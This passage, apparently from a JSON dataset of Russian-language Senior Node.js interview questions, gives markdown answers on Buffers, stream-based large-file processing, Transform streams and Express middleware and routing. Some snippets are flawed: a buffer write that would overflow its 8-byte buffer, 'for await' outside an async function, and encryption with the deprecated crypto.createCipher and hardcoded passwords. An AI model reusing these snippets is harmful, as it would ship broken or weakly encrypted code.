World'\n\n// Нарезка (создает VIEW, не копию!)\nconst slice = buf.slice(0, 5);\nconsole.log(slice.toString()); // 'Jello'\n\n// Изменение slice влияет на оригинал:\nslice[0] = 72; // 'H'\nconsole.log(buf.toString());   // 'Hello World' (оригинал изменился!)\n\n// Копирование\nconst copy = Buffer.from(buf);\ncopy[0] = 88; // 'X'\nconsole.log(buf.toString());   // 'Hello World' (оригинал НЕ изменился)\nconsole.log(copy.toString());  // 'Xello World'\n```\n\n**Конкатенация:**\n\n```javascript\nconst buf1 = Buffer.from('Hello ');\nconst buf2 = Buffer.from('World');\n\n// Array.concat() не работает для Buffer\nconst buf3 = Buffer.concat([buf1, buf2]);\nconsole.log(buf3.toString()); // 'Hello World'\n\n// С указанием общей длины (для производительности)\nconst buf4 = Buffer.concat([buf1, buf2], buf1.length + buf2.length);\n```\n\n**Работа с бинарными данными:**\n\n```javascript\nconst buf = Buffer.alloc(8);\n\n// Запись чисел разных типов\nbuf.writeUInt8(255, 0);           // 1 байт на позиции 0\nbuf.writeUInt16BE(65535, 1);      // 2 байта, Big Endian\nbuf.writeInt32LE(-123456, 3);     // 4 байта, Little Endian\nbuf.writeFloatLE(3.14, 7);        // Float пишется за пределы? Нет, только 4 байта\n\n// Чтение чисел\nconsole.log(buf.readUInt8(0));    // 255\nconsole.log(buf.readUInt16BE(1)); // 65535\nconsole.log(buf.readInt32LE(3));  // -123456\n\n// ❌ С массивом такое невозможно\n```\n\n**Безопасность:**\n\n```javascript\n// ❌ НЕБЕЗОПАСНО - может содержать старые данные из памяти\nconst unsafeBuf = Buffer.allocUnsafe(10);\nconsole.log(unsafeBuf); // Может показать пароли/ключи из памяти!\n\n// ✅ БЕЗОПАСНО - заполнено нулями\nconst safeBuf = Buffer.alloc(10);\nconsole.log(safeBuf); // <Buffer 00 00 00 00 00 00 00 00 00 00>\n\n// Когда использовать allocUnsafe:\n// 1. Вы немедленно перезапишете весь буфер\n// 2. Производительность критична\n// 3. Вы понимаете риски\n```\n\n**Практический пример - чтение изображения:**\n\n```javascript\nconst fs = require('fs');\n\n// Чтение изображения в Buffer\nconst imageBuffer = fs.readFileSync('image.png');\n\nconsole.log(Buffer.isBuffer(imageBuffer)); // true\nconsole.log(imageBuffer.length);           // Размер в байтах\n\n// Конвертация в Base64 для отправки в браузер\nconst base64Image = imageBuffer.toString('base64');\nconst dataUrl = `data:image/png;base64,${base64Image}`;\n\n// Отправка через HTTP\nres.send(`<img src=\"${dataUrl}\" />`);\n```\n\n**Когда использовать Buffer vs Array:**\n\n```javascript\n// ✅ Используйте Buffer для:\n// - Чтения/записи файлов\n// - Работы с сетевыми протоколами\n// - Криптографии\n// - Бинарных данных (изображения, видео, аудио)\nconst fileBuffer = fs.readFileSync('file.bin');\n\n// ✅ Используйте Array для:\n// - Коллекций JavaScript объектов\n// - Динамических списков\n// - Операций высокого уровня (map, filter, reduce)\nconst users = [{ id: 1 }, { id: 2 }];\n```\n\n\n",
          "best_practices": [],
          "difficulty": "Senior"
        },
        {
          "question_number": 30,
          "question_number_in_chapter": 4,
          "question_chapter": 4,
          "question_title": "Как правильно работать с большими файлами в Node.js?",
          "answer_markdown": "\n**Ответ:**\n\nДля работы с большими файлами **НИКОГДА** не загружайте их целиком в память. Используйте **Streams** для потоковой обработки.\n\n**❌ НЕПРАВИЛЬНО (загрузка в память):**\n\n```javascript\nconst fs = require('fs');\n\n// ❌ Плохо - загружает весь файл в память (10GB файл = crash)\nasync function processLargeFile() {\n  const data = fs.readFileSync('large-file.txt', 'utf8'); // OOM!\n  console.log(data.length);\n}\n\n// ❌ Плохо - то же самое асинхронно\nasync function processLargeFileAsync() {\n  const data = await fs.promises.readFile('large-file.txt', 'utf8'); // OOM!\n  console.log(data.length);\n}\n```\n\n**✅ ПРАВИЛЬНО (стримы):**\n\n**1. Чтение большого файла построчно:**\n\n```javascript\nconst fs = require('fs');\nconst readline = require('readline');\n\nasync function processLargeFile(filePath) {\n  const fileStream = fs.createReadStream(filePath);\n\n  const rl = readline.createInterface({\n    input: fileStream,\n    crlfDelay: Infinity // Обработка \\r\\n как одного перевода строки\n  });\n\n  let lineNumber = 0;\n  let errorCount = 0;\n\n  for await (const line of rl) {\n    lineNumber++;\n\n    // Обработка каждой строки по отдельности\n    if (line.includes('ERROR')) {\n      errorCount++;\n      console.log(`Error on line ${lineNumber}: ${line}`);\n    }\n\n    // Прогресс каждые 1000 строк\n    if (lineNumber % 1000 === 0) {\n      console.log(`Processed ${lineNumber} lines...`);\n    }\n  }\n\n  console.log(`Total lines: ${lineNumber}`);\n  console.log(`Total errors: ${errorCount}`);\n}\n\nprocessLargeFile('app.log'); // Даже файл 100GB обработается!\n```\n\n**2. Копирование большого файла:**\n\n```javascript\nconst fs = require('fs');\nconst { pipeline } = require('stream/promises');\n\nasync function copyLargeFile(source, destination) {\n  try {\n    await pipeline(\n      fs.createReadStream(source),\n      fs.createWriteStream(destination)\n    );\n    console.log('File copied successfully');\n  } catch (err) {\n    console.error('Copy failed:', err);\n  }\n}\n\ncopyLargeFile('source.mp4', 'destination.mp4');\n```\n\n**3. Сжатие большого файла:**\n\n```javascript\nconst fs = require('fs');\nconst zlib = require('zlib');\nconst { pipeline } = require('stream/promises');\n\nasync function compressFile(inputFile, outputFile) {\n  try {\n    await pipeline(\n      fs.createReadStream(inputFile),\n      zlib.createGzip(),\n      fs.createWriteStream(outputFile)\n    );\n    console.log('Compression successful');\n  } catch (err) {\n    console.error('Compression failed:', err);\n  }\n}\n\ncompressFile('large-log.txt', 'large-log.txt.gz');\n```\n\n**4. Обработка CSV файла:**\n\n```javascript\nconst fs = require('fs');\nconst csv = require('csv-parser');\nconst { Transform } = require('stream');\n\n// Transform stream для обработки каждой строки CSV\nclass CSVProcessor extends Transform {\n  constructor() {\n    super({ objectMode: true });\n    this.processedCount = 0;\n  }\n\n  _transform(row, encoding, callback) {\n    this.processedCount++;\n\n    // Обработка каждой строки\n    if (row.age > 18) {\n      row.adult = true;\n      this.push(JSON.stringify(row) + '\\n');\n    }\n\n    callback();\n  }\n\n  _flush(callback) {\n    console.log(`Processed ${this.processedCount} rows`);\n    callback();\n  }\n}\n\n// Чтение CSV → Обработка → Запись JSON\nfs.createReadStream('users.csv')\n  .pipe(csv())\n  .pipe(new CSVProcessor())\n  .pipe(fs.createWriteStream('adults.jsonl'));\n```\n\n**5. Загрузка большого файла через HTTP:**\n\n```javascript\nconst http = require('http');\nconst fs = require('fs');\n\nhttp.createServer((req, res) => {\n  if (req.url === '/download' && req.method === 'GET') {\n    const filePath = './large-video.mp4';\n\n    // Получаем размер файла\n    const stat = fs.statSync(filePath);\n\n    res.writeHead(200, {\n      'Content-Type': 'video/mp4',\n      'Content-Length': stat.size,\n      'Content-Disposition': 'attachment; filename=video.mp4'\n    });\n\n    // ✅ Стримим файл клиенту (не загружаем в память)\n    const readStream = fs.createReadStream(filePath);\n\n    readStream.pipe(res);\n\n    readStream.on('error', (err) => {\n      console.error('Stream error:', err);\n      res.statusCode = 500;\n      res.end('Server Error');\n    });\n\n    // Логирование прогресса\n    let bytesRead = 0;\n    readStream.on('data', (chunk) => {\n      bytesRead += chunk.length;\n      const progress = ((bytesRead / stat.size) * 100).toFixed(2);\n      console.log(`Progress: ${progress}%`);\n    });\n  }\n}).listen(3000);\n```\n\n**6. Парсинг JSON файла (большого):**\n\n```javascript\nconst fs = require('fs');\nconst { Transform } = require('stream');\nconst JSONStream = require('JSONStream'); // npm install JSONStream\n\n// Парсинг большого JSON массива\nfs.createReadStream('users.json')\n  .pipe(JSONStream.parse('*')) // Парсит каждый элемент массива по отдельности\n  .pipe(new Transform({\n    objectMode: true,\n    transform(user, encoding, callback) {\n      // Обработка каждого пользователя\n      if (user.active) {\n        console.log(user.name);\n      }\n      callback();\n    }\n  }));\n```\n\n**7. Chunked обработка с контролем памяти:**\n\n```javascript\nconst fs = require('fs');\n\nasync function processFileInChunks(filePath, chunkSize = 1024 * 1024) {\n  const fileHandle = await fs.promises.open(filePath, 'r');\n  const buffer = Buffer.alloc(chunkSize);\n\n  let position = 0;\n  let bytesRead = 0;\n\n  try {\n    while (true) {\n      const result = await fileHandle.read(buffer, 0, chunkSize, position);\n      bytesRead = result.bytesRead;\n\n      if (bytesRead === 0) break; // Конец файла\n\n      // Обработка чанка\n      const chunk = buffer.slice(0, bytesRead);\n      processChunk(chunk);\n\n      position += bytesRead;\n    }\n  } finally {\n    await fileHandle.close();\n  }\n}\n\nfunction processChunk(chunk) {\n  // Ваша логика обработки чанка\n  console.log(`Processed ${chunk.length} bytes`);\n}\n\nprocessFileInChunks('large-file.bin');\n```\n\n**8. Мониторинг использования памяти:**\n\n```javascript\nconst fs = require('fs');\n\nfunction logMemoryUsage() {\n  const used = process.memoryUsage();\n  console.log({\n    rss: `${Math.round(used.rss / 1024 / 1024)} MB`,         // Резидентная память\n    heapTotal: `${Math.round(used.heapTotal / 1024 / 1024)} MB`,\n    heapUsed: `${Math.round(used.heapUsed / 1024 / 1024)} MB`,\n    external: `${Math.round(used.external / 1024 / 1024)} MB`\n  });\n}\n\n// ❌ Загрузка в память\nconsole.log('Before readFileSync:');\nlogMemoryUsage();\n\nconst data = fs.readFileSync('large-file.txt');\n\nconsole.log('After readFileSync:');\nlogMemoryUsage(); // Память выросла на размер файла!\n\n// ✅ Стримы\nconsole.log('Before stream:');\nlogMemoryUsage();\n\nfs.createReadStream('large-file.txt')\n  .on('data', () => {})\n  .on('end', () => {\n    console.log('After stream:');\n    logMemoryUsage(); // Память НЕ выросла!\n  });\n```\n\n**9. Обработка нескольких больших файлов параллельно:**\n\n```javascript\nconst fs = require('fs');\nconst { pipeline } = require('stream/promises');\n\nasync function processMultipleFiles(files) {\n  // ❌ Последовательно (медленно)\n  // for (const file of files) {\n  //   await processFile(file);\n  // }\n\n  // ✅ Параллельно с ограничением (pLimit)\n  const pLimit = require('p-limit');\n  const limit = pLimit(3); // Максимум 3 файла одновременно\n\n  await Promise.all(\n    files.map(file => limit(() => processFile(file)))\n  );\n}\n\nasync function processFile(filePath) {\n  await pipeline(\n    fs.createReadStream(filePath),\n    // ... трансформации\n    fs.createWriteStream(filePath + '.processed')\n  );\n}\n\nprocessMultipleFiles(['file1.txt', 'file2.txt', 'file3.txt', 'file4.txt']);\n```\n\n",
          "best_practices": [],
          "difficulty": "Senior"
        },
        {
          "question_number": 31,
          "question_number_in_chapter": 5,
          "question_chapter": 4,
          "question_title": "Что такое Transform streams? Приведи пример использования",
          "answer_markdown": "\n**Ответ:**\n\n**Transform Stream** - это тип Duplex stream, который позволяет читать данные, **трансформировать** их, и записывать результат. Это идеальный инструмент для обработки данных \"на лету\" без загрузки в память.\n\n**Основные методы Transform Stream:**\n\n| Метод | Назначение | Когда вызывается |\n|-------|-----------|------------------|\n| `_transform(chunk, encoding, callback)` | Обработка каждого чанка | Когда приходят данные |\n| `_flush(callback)` | Финальная обработка | Перед завершением стрима |\n\n**Простой пример - Transform в верхний регистр:**\n\n```javascript\nconst { Transform } = require('stream');\n\nclass UpperCaseTransform extends Transform {\n  _transform(chunk, encoding, callback) {\n    // chunk - Buffer или String\n    // encoding - кодировка (если chunk это String)\n    // callback - вызываем когда обработка завершена\n\n    const upperChunk = chunk.toString().toUpperCase();\n\n    // Отправляем трансформированные данные дальше\n    this.push(upperChunk);\n\n    // Сигнализируем что обработка завершена\n    callback();\n  }\n}\n\n// Использование\nconst upperCase = new UpperCaseTransform();\n\nprocess.stdin\n  .pipe(upperCase)\n  .pipe(process.stdout);\n\n// Ввод: hello world\n// Вывод: HELLO WORLD\n```\n\n**Пример с _flush() - добавление итогов:**\n\n```javascript\nconst { Transform } = require('stream');\n\nclass LineCounter extends Transform {\n  constructor() {\n    super();\n    this.lineCount = 0;\n  }\n\n  _transform(chunk, encoding, callback) {\n    const lines = chunk.toString().split('\\n');\n    this.lineCount += lines.length - 1; // -1 т.к. последняя строка может быть неполной\n\n    // Пропускаем данные дальше без изменений\n    this.push(chunk);\n    callback();\n  }\n\n  _flush(callback) {\n    // Вызывается когда все данные обработаны\n    // Добавляем итоговую статистику\n    this.push(`\\n\\nTotal lines: ${this.lineCount}\\n`);\n    callback();\n  }\n}\n\nconst fs = require('fs');\n\nfs.createReadStream('file.txt')\n  .pipe(new LineCounter())\n  .pipe(process.stdout);\n```\n\n**Практический пример - CSV в JSON:**\n\n```javascript\nconst { Transform } = require('stream');\nconst fs = require('fs');\n\nclass CSVToJSON extends Transform {\n  constructor() {\n    super({ objectMode: true }); // Работаем с объектами, не с Buffer\n    this.headers = null;\n    this.isFirstLine = true;\n  }\n\n  _transform(line, encoding, callback) {\n    if (this.isFirstLine) {\n      // Первая строка - заголовки\n      this.headers = line.toString().trim().split(',');\n      this.isFirstLine = false;\n      callback();\n      return;\n    }\n\n    const values = line.toString().trim().split(',');\n    const obj = {};\n\n    this.headers.forEach((header, index) => {\n      obj[header] = values[index];\n    });\n\n    // Отправляем JSON объект дальше\n    this.push(JSON.stringify(obj) + '\\n');\n    callback();\n  }\n}\n\nconst readline = require('readline');\nconst inputStream = fs.createReadStream('users.csv');\nconst outputStream = fs.createWriteStream('users.jsonl');\n\nconst rl = readline.createInterface({\n  input: inputStream,\n  crlfDelay: Infinity\n});\n\nconst csvToJson = new CSVToJSON();\n\n// CSV → Transform → JSON\nlet isFirst = true;\nfor await (const line of rl) {\n  csvToJson.write(line);\n}\ncsvToJson.end();\n\ncsvToJson.pipe(outputStream);\n```\n\n**Практический пример - Шифрование файла на лету:**\n\n```javascript\nconst { Transform } = require('stream');\nconst crypto = require('crypto');\nconst fs = require('fs');\n\nclass EncryptTransform extends Transform {\n  constructor(algorithm, key) {\n    super();\n    this.cipher = crypto.createCipher(algorithm, key);\n  }\n\n  _transform(chunk, encoding, callback) {\n    // Шифруем каждый чанк\n    const encrypted = this.cipher.update(chunk);\n    this.push(encrypted);\n    callback();\n  }\n\n  _flush(callback) {\n    // Финализируем шифрование\n    const final = this.cipher.final();\n    this.push(final);\n    callback();\n  }\n}\n\n// Использование\nconst encrypt = new EncryptTransform('aes192', 'secret-password');\n\nfs.createReadStream('document.txt')\n  .pipe(encrypt)\n  .pipe(fs.createWriteStream('document.txt.encrypted'));\n```\n\n**Объединение нескольких Transform:**\n\n```javascript\nconst { Transform, pipeline } = require('stream');\nconst fs = require('fs');\nconst zlib = require('zlib');\n\n// Transform 1: Добавляет timestamp к каждой строке\nclass AddTimestamp extends Transform {\n  _transform(chunk, encoding, callback) {\n    const timestamp = new Date().toISOString();\n    const lines = chunk.toString().split('\\n');\n    const timestamped = lines\n      .map(line => line ? `[${timestamp}] ${line}` : '')\n      .join('\\n');\n    this.push(timestamped);\n    callback();\n  }\n}\n\n// Transform 2: Фильтрует строки содержащие \"ERROR\"\nclass FilterErrors extends Transform {\n  _transform(chunk, encoding, callback) {\n    const lines = chunk.toString().split('\\n');\n    const errors = lines.filter(line => line.includes('ERROR'));\n    if (errors.length > 0) {\n      this.push(errors.join('\\n') + '\\n');\n    }\n    callback();\n  }\n}\n\n// Цепочка: Читаем → Добавляем timestamp → Фильтруем → Сжимаем → Записываем\npipeline(\n  fs.createReadStream('app.log'),\n  new AddTimestamp(),\n  new FilterErrors(),\n  zlib.createGzip(),\n  fs.createWriteStream('errors.log.gz'),\n  (err) => {\n    if (err) {\n      console.error('Pipeline failed', err);\n    } else {\n      console.log('Pipeline succeeded');\n    }\n  }\n);\n```\n\n**Transform с асинхронной обработкой:**\n\n```javascript\nconst { Transform } = require('stream');\nconst axios = require('axios');\n\nclass EnrichWithAPI extends Transform {\n  constructor() {\n    super({ objectMode: true });\n  }\n\n  async _transform(user, encoding, callback) {\n    try {\n      // Асинхронный API вызов для каждого пользователя\n      const response = await axios.get(`https://api.example.com/users/${user.id}`);\n\n      // Обогащаем данные\n      user.additionalInfo = response.data;\n\n      this.push(user);\n      callback();\n    } catch (err) {\n      callback(err);\n    }\n  }\n}\n\n// Использование\nconst { Readable } = require('stream');\n\nconst users = [\n  { id: 1, name: 'Alice' },\n  { id: 2, name: 'Bob' }\n];\n\nReadable.from(users)\n  .pipe(new EnrichWithAPI())\n  .on('data', (enrichedUser) => {\n    console.log(enrichedUser);\n  });\n```\n\n**Transform с контролем скорости (Rate Limiting):**\n\n```javascript\nconst { Transform } = require('stream');\n\nclass RateLimitTransform extends Transform {\n  constructor(maxPerSecond) {\n    super({ objectMode: true });\n    this.maxPerSecond = maxPerSecond;\n    this.count = 0;\n    this.startTime = Date.now();\n  }\n\n  _transform(chunk, encoding, callback) {\n    this.count++;\n\n    const elapsed = Date.now() - this.startTime;\n    const rate = (this.count / elapsed) * 1000; // в секунду\n\n    if (rate > this.maxPerSecond) {\n      // Превышен лимит - задержка\n      const delay = 1000 / this.maxPerSecond;\n      setTimeout(() => {\n        this.push(chunk);\n        callback();\n      }, delay);\n    } else {\n      // В пределах лимита\n      this.push(chunk);\n      callback();\n    }\n  }\n}\n\n// Использование\nconst { Readable } = require('stream');\n\nconst numbers = Array.from({ length: 100 }, (_, i) => i);\n\nReadable.from(numbers)\n  .pipe(new RateLimitTransform(10)) // Максимум 10 элементов в секунду\n  .on('data', (num) => {\n    console.log(`Processed: ${num}`);\n  });\n```\n\n**Практический пример - парсинг логов Apache/Nginx:**\n\n```javascript\nconst { Transform } = require('stream');\nconst fs = require('fs');\nconst readline = require('readline');\n\nclass LogParser extends Transform {\n  constructor() {\n    super({ objectMode: true });\n    this.errorCount = 0;\n    this.successCount = 0;\n  }\n\n  _transform(line, encoding, callback) {\n    // Парсинг строки лога\n    // Формат: IP - - [Date] \"METHOD /path HTTP/1.1\" STATUS SIZE\n    const regex = /^(\\S+) .* \\[(.*?)\\] \"(.*?)\" (\\d+) (\\d+)/;\n    const match = line.toString().match(regex);\n\n    if (match) {\n      const [, ip, date, request, status, size] = match;\n\n      const logEntry = {\n        ip,\n        date: new Date(date),\n        request,\n        status: parseInt(status),\n        size: parseInt(size)\n      };\n\n      if (logEntry.status >= 400) {\n        this.errorCount++;\n      } else {\n        this.successCount++;\n      }\n\n      this.push(logEntry);\n    }\n\n    callback();\n  }\n\n  _flush(callback) {\n    // Итоговая статистика\n    console.log(`\\nSuccess: ${this.successCount}, Errors: ${this.errorCount}`);\n    callback();\n  }\n}\n\nasync function parseAccessLog(filePath) {\n  const fileStream = fs.createReadStream(filePath);\n  const rl = readline.createInterface({\n    input: fileStream,\n    crlfDelay: Infinity\n  });\n\n  const parser = new LogParser();\n\n  for await (const line of rl) {\n    parser.write(line);\n  }\n  parser.end();\n\n  parser.on('data', (logEntry) => {\n    if (logEntry.status === 404) {\n      console.log(`404 Error: ${logEntry.request} from ${logEntry.ip}`);\n    }\n  });\n}\n\nparseAccessLog('/var/log/nginx/access.log');\n```\n\n**Встроенные Transform Streams в Node.js:**\n\n```javascript\nconst zlib = require('zlib');\nconst crypto = require('crypto');\nconst fs = require('fs');\n\n// 1. Compression (gzip, deflate, brotli)\nfs.createReadStream('file.txt')\n  .pipe(zlib.createGzip())\n  .pipe(fs.createWriteStream('file.txt.gz'));\n\n// 2. Decompression\nfs.createReadStream('file.txt.gz')\n  .pipe(zlib.createGunzip())\n  .pipe(fs.createWriteStream('file.txt'));\n\n// 3. Encryption\nfs.createReadStream('secret.txt')\n  .pipe(crypto.createCipher('aes192', 'password'))\n  .pipe(fs.createWriteStream('secret.txt.enc'));\n\n// 4. Decryption\nfs.createReadStream('secret.txt.enc')\n  .pipe(crypto.createDecipher('aes192', 'password'))\n  .pipe(fs.createWriteStream('secret.txt'));\n\n// 5. Hashing\nconst hash = crypto.createHash('sha256');\nfs.createReadStream('file.txt')\n  .pipe(hash)\n  .on('finish', () => {\n    console.log('Hash:', hash.digest('hex'));\n  });\n```\n\n",
          "best_practices": [],
          "difficulty": "Senior"
        }
      ]
    },
    {
      "chapter_number": 5,
      "chapter_title": "Express.js & Web Development",
      "questions_count": 7,
      "questions": [
        {
          "question_number": 32,
          "question_number_in_chapter": 1,
          "question_chapter": 5,
          "question_title": "Что такое middleware в Express.js? Какие типы middleware бывают?",
          "answer_markdown": "\n**Ответ:**\n\n**Middleware** - это функции которые имеют доступ к объектам запроса (`req`), ответа (`res`) и следующей middleware функции в цикле запрос-ответ приложения (`next`).\n\n**Сигнатура middleware:**\n\n```javascript\nfunction middleware(req, res, next) {\n  // Логика обработки\n  next(); // Передать управление следующему middleware\n}\n```\n\n**Типы middleware в Express.js:**\n\n| Тип | Описание | Пример |\n|-----|----------|--------|\n| **Application-level** | Привязан к `app.use()` или `app.METHOD()` | Логирование, CORS |\n| **Router-level** | Привязан к `router.use()` | Аутентификация для группы роутов |\n| **Error-handling** | 4 параметра `(err, req, res, next)` | Централизованная обработка ошибок |\n| **Built-in** | Встроенные в Express | `express.json()`, `express.static()` |\n| **Third-party** | Пакеты из npm | `morgan`, `helmet`, `cors` |\n\n**1. Application-level Middleware:**\n\n```javascript\nconst express = require('express');\nconst app = express();\n\n// Middleware для всех роутов\napp.use((req, res, next) => {\n  console.log(`${req.method} ${req.url} - ${new Date().toISOString()}`);\n  next(); // ← Важно! Передаем управление дальше\n});\n\n// Middleware для конкретного пути\napp.use('/api', (req, res, next) => {\n  console.log('API request');\n  next();\n});\n\n// Middleware для конкретного HTTP метода\napp.get('/users', (req, res, next) => {\n  console.log('GET /users');\n  next();\n});\n\napp.listen(3000);\n```\n\n**2. Router-level Middleware:**\n\n```javascript\nconst express = require('express');\nconst router = express.Router();\n\n// Middleware для всех роутов в этом роутере\nrouter.use((req, res, next) => {\n  console.log('Router middleware');\n  next();\n});\n\n// Middleware для проверки аутентификации\nrouter.use((req, res, next) => {\n  if (!req.headers.authorization) {\n    return res.status(401).json({ error: 'Unauthorized' });\n  }\n  next();\n});\n\n// Роуты\nrouter.get('/profile', (req, res) => {\n  res.json({ user: 'John' });\n});\n\nrouter.post('/logout', (req, res) => {\n  res.json({ message: 'Logged out' });\n});\n\napp.use('/api', router);\n```\n\n**3. Error-handling Middleware:**\n\n```javascript\n// ❗ Важно: должен быть ПОСЛЕДНИМ в цепочке middleware\napp.use((err, req, res, next) => {\n  console.error(err.stack);\n\n  // Кастомная обработка разных типов ошибок\n  if (err.name === 'ValidationError') {\n    return res.status(400).json({\n      error: 'Validation Error',\n      details: err.message\n    });\n  }\n\n  if (err.name === 'UnauthorizedError') {\n    return res.status(401).json({\n      error: 'Unauthorized'\n    });\n  }\n\n  // Дефолтная обработка\n  res.status(err.status || 500).json({\n    error: err.message || 'Internal Server Error'\n  });\n});\n\n// Использование\napp.get('/users/:id', async (req, res, next) => {\n  try {\n    const user = await getUserById(req.params.id);\n    if (!user) {\n      const err = new Error('User not found');\n      err.status = 404;\n      throw err;\n    }\n    res.json(user);\n  } catch (err) {\n    next(err); // ← Передаем ошибку в error handler\n  }\n});\n```\n\n**4. Built-in Middleware:**\n\n```javascript\nconst express = require('express');\nconst app = express();\n\n// 1. Парсинг JSON тела запроса\napp.use(express.json());\n\n// 2. Парсинг URL-encoded данных (формы)\napp.use(express.urlencoded({ extended: true }));\n\n// 3. Статические файлы\napp.use(express.static('public'));\n// Теперь файлы из /public доступны по http://localhost:3000/file.html\n\napp.post('/api/users', (req, res) => {\n  console.log(req.body); // ← Распарсено express.json()\n  res.json(req.body);\n});\n```\n\n**5. Third-party Middleware:**\n\n```javascript\nconst express = require('express');\nconst morgan = require('morgan');      // Логирование\nconst helmet = require('helmet');      // Безопасность\nconst cors = require('cors');          // CORS\nconst compression = require('compression'); // Gzip\n\nconst app = express();\n\n// Логирование HTTP запросов\napp.use(morgan('combined'));\n\n// Безопасность (устанавливает заголовки)\napp.use(helmet());\n\n// CORS\napp.use(cors({\n  origin: 'https://example.com',\n  credentials: true\n}));\n\n// Gzip сжатие ответов\napp.use(compression());\n```\n\n**Порядок выполнения middleware:**\n\n```javascript\nconst express = require('express');\nconst app = express();\n\n// 1. Первый middleware\napp.use((req, res, next) => {\n  console.log('1. First middleware');\n  next();\n});\n\n// 2. Второй middleware\napp.use((req, res, next) => {\n  console.log('2. Second middleware');\n  next();\n});\n\n// 3. Роут\napp.get('/test', (req, res, next) => {\n  console.log('3. Route handler');\n  res.send('Response');\n  // next(); ← НЕ вызываем, т.к. уже отправили ответ\n});\n\n// 4. Этот middleware НЕ выполнится для GET /test\napp.use((req, res, next) => {\n  console.log('4. After route handler');\n  next();\n});\n\n// Вывод для GET /test:\n// 1. First middleware\n// 2. Second middleware\n// 3. Route handler\n```\n\n**Middleware с условиями:**\n\n```javascript\n// Middleware выполняется только для определенных условий\napp.use((req, res, next) => {\n  if (req.headers['x-api-key'] !== 'secret-key') {\n    return res.status(403).json({ error: 'Forbidden' });\n  }\n  next();\n});\n\n// Middleware пропускается для определенных роутов\napp.use((req, res, next) => {\n  if (req.path === '/public') {\n    return next(); // Пропускаем проверку для /public\n  }\n\n  // Проверка аутентификации для остальных роутов\n  if (!req.session.user) {\n    return res.status(401).json({ error: 'Unauthorized' });\n  }\n\n  next();\n});\n```\n\n**Асинхронный middleware:**\n\n```javascript\n// ❌ НЕПРАВИЛЬНО - ошибка не будет обработана\napp.use(async (req, res, next) => {\n  const user = await db.getUser(req.userId);\n  req.user = user;\n  next();\n}); // Если db.getUser() выбросит ошибку → unhandled rejection\n\n// ✅ ПРАВИЛЬНО - с обработкой ошибок\napp.use(async (req, res, next) => {\n  try {\n    const user = await db.getUser(req.userId);\n    req.user = user;\n    next();\n  } catch (err) {\n    next(err); // Передаем ошибку в error handler\n  }\n});\n\n// ✅ ЕЩЕ ЛУЧШЕ - wrapper для async middleware\nfunction asyncHandler(fn) {\n  return (req, res, next) => {\n    Promise.resolve(fn(req, res, next)).catch(next);\n  };\n}\n\n// Использование\napp.use(asyncHandler(async (req, res, next) => {\n  const user = await db.getUser(req.userId);\n  req.user = user;\n  next();\n}));\n```\n\n**Практический пример - authentication middleware:**\n\n```javascript\nconst jwt = require('jsonwebtoken');\n\n// Middleware для проверки JWT токена\nfunction authenticate(req, res, next) {\n  const token = req.headers.authorization?.split(' ')[1]; // \"Bearer TOKEN\"\n\n  if (!token) {\n    return res.status(401).json({ error: 'No token provided' });\n  }\n\n  try {\n    const decoded = jwt.verify(token, process.env.JWT_SECRET);\n    req.user = decoded; // Добавляем пользователя в req\n    next();\n  } catch (err) {\n    return res.status(401).json({ error: 'Invalid token' });\n  }\n}\n\n// Middleware для проверки ролей\nfunction authorize(...roles) {\n  return (req, res, next) => {\n    if (!req.user) {\n      return res.status(401).json({ error: 'Unauthorized' });\n    }\n\n    if (!roles.includes(req.user.role)) {\n      return res.status(403).json({ error: 'Forbidden' });\n    }\n\n    next();\n  };\n}\n\n// Использование\napp.get('/public', (req, res) => {\n  res.json({ message: 'Public endpoint' });\n});\n\napp.get('/profile', authenticate, (req, res) => {\n  res.json({ user: req.user });\n});\n\napp.delete('/users/:id', authenticate, authorize('admin'), (req, res) => {\n  // Только для аутентифицированных admin\n  res.json({ message: 'User deleted' });\n});\n```\n\n",
          "best_practices": [],
          "difficulty": "Senior"
        },
        {
          "question_number": 33,
          "question_number_in_chapter": 2,
          "question_chapter": 5,
          "question_title": "Как работает роутинг в Express.js?",
          "answer_markdown": "\n**Ответ:**\n\n**Роутинг** - это механизм определения того, как приложение отвечает на запросы клиента к определенным путям (endpoints) с определенным HTTP методом (GET, POST, PUT, DELETE и т.д.).\n\n**Базовая структура роута:**\n\n```javascript\napp.METHOD(PATH, HANDLER)\n```\n\n- **METHOD** - HTTP метод (get, post, put, delete, patch, options, head)\n- **PATH** - путь на сервере\n- **HANDLER** - функция-обработчик (callback)\n\n**Простой роутинг:**\n\n```javascript\nconst express = require('express');\nconst app = express();\n\n// GET запрос\napp.get('/', (req, res) => {\n  res.send('GET запрос к главной странице');\n});\n\n// POST запрос\napp.post('/users', (req, res) => {\n  res.send('POST запрос для создания пользователя');\n});\n\n// PUT запрос\napp.put('/users/:id', (req, res) => {\n  res.send(`PUT запрос для обновления пользователя ${req.params.id}`);\n});\n\n// DELETE запрос\napp.delete('/users/:id', (req, res) => {\n  res.send(`DELETE запрос для удаления пользователя ${req.params.id}`);\n});\n\n// Обработка всех методов\napp.all('/secret', (req, res) => {\n  res.send('Секретная страница');\n});\n```\n\n**Route Parameters (параметры пути):**\n\n```javascript\n// Одиночный параметр\napp.get('/users/:userId', (req, res) => {\n  console.log(req.params.userId); // \"123\"\n  res.send(`User ID: ${req.params.userId}`);\n});\n// GET /users/123\n\n// Множественные параметры\napp.get('/users/:userId/posts/:postId', (req, res) => {\n  console.log(req.params); // { userId: '123', postId: '456' }\n  res.send(`User: ${req.params.userId}, Post: ${req.params.postId}`);\n});\n// GET /users/123/posts/456\n\n// С регулярным выражением\napp.get('/users/:id(\\\\d+)', (req, res) => {\n  // Только цифры\n  res.send(`User ID: ${req.params.id}`);\n});\n// GET /users/123 - работает\n// GET /users/abc - не работает\n\n// Опциональные параметры\napp.get('/users/:id?', (req, res) => {\n  if (req.params.id) {\n    res.send(`User ID: ${req.params.id}`);\n  } else {\n    res.send('All users');\n  }\n});\n// GET /users - All users\n// GET /users/123 - User ID: 123\n```\n\n**Query Parameters (параметры запроса):**\n\n```javascript\napp.get('/search', (req, res) => {\n  console.log(req.query);\n  // GET /search?q=nodejs&limit=10\n  // { q: 'nodejs', limit: '10' }\n\n  const { q, limit = 20 } = req.query;\n  res.json({ query: q, limit });\n});\n```\n\n**Роутинг с использованием Router:**\n\n```javascript\n// routes/users.js\nconst express = require('express');\nconst router = express.Router();\n\n// Middleware для всех роутов в этом файле\nrouter.use((req, res, next) => {\n  console.log('Time:', Date.now());\n  next();\n});\n\n// GET /users\nrouter.get('/', (req, res) => {\n  res.json({ users: [] });\n});\n\n// GET 